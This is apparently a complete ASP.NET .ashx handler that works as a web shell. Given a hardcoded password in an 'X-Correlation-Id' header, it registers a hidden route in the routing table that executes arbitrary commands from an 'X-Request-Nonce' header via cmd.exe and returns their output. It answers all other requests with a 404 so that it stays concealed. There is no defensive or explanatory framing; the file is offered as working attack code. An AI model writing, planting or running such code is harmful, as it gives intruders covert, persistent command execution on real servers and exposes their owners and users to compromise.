<%@ WebHandler Language="C#" Class="Activator" %>

using System;
using System.Web;
using System.Web.Routing;
using System.Diagnostics;

public class Activator : IHttpHandler
{
    private static bool _done = false;

    public void ProcessRequest(HttpContext context)
    {
        context.Response.ContentType = "text/plain";

        if (context.Request.Headers["X-Correlation-Id"] != "p@ssw0rd-2026") {
            context.Response.StatusCode = 404;
            context.Response.End();
            return;
        }

        try {
            if (!_done) {
                _done = true;
                RouteCollection routes = RouteTable.Routes;
                int before = routes.Count;
                using (routes.GetWriteLock()) {
                    routes.Insert(0, new ShellRoute());
                }
                context.Response.Write("rt:1 before=" + before + " after=" + routes.Count);
            } else {
                context.Response.Write("s:1 n=" + RouteTable.Routes.Count);
            }
        } catch (Exception ex) {
            context.Response.Write("s:0 e=" + ex.Message);
        }
        context.Response.End();
    }

    public bool IsReusable { get { return false; } }
}

public class ShellRoute : RouteBase
{
    public override RouteData GetRouteData(HttpContextBase context)
    {
        try {
            string password = context.Request.Headers["X-Correlation-Id"];
            string command  = context.Request.Headers["X-Request-Nonce"];

            if (password != "p@ssw0rd-2026" || command == null) return null;

            var psi = new ProcessStartInfo("cmd.exe", "/c " + command);
            psi.UseShellExecute        = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError  = true;
            psi.CreateNoWindow         = true;

            string output;
            using (var p = Process.Start(psi))
                output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();

            context.Response.Clear();
            context.Response.ContentType = "text/plain";
            context.Response.Write(output.Length > 0 ? output : "(empty)");
            context.Response.End();
        } catch { }

        return null;
    }

    public override VirtualPathData GetVirtualPath(RequestContext requestContext, RouteValueDictionary values)
    {
        return null;
    }
}
